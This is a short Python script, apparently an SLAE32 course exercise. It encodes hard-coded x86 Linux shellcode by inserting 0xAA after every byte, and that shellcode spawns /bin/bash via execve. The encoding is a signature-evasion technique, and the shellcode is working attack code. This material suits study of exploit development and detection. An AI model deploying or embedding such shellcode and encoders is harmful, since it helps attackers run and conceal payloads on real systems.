#!/usr/bin/python3
import random

# Python3 Insertion Encoder
# SLAE32

shellcode = (
# Place shellcode here
b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print ("Encoded shellcode with random insertion...\n")

for x in shellcode:
    encoded += "\\x"
    encoded += "%02x" % x
    encoded += "\\x%02x" % 0xAA     # Insert 0xAA after every single byte in shellcode

    # encoded += "\\x%02x" % random.randint(1,255)

    encoded2 += "0x"
    encoded2 += "%02x," % x
    encoded2 += "0x%02x," % 0xAA

    # encoded2 += "\\x%02x" % random.randint(1,255)

print(encoded)
print()
print(encoded2)
print()

print("Original shellcode length: %d" % len(shellcode))
print("Encoded shellcode length: %d" % (len(encoded)/4))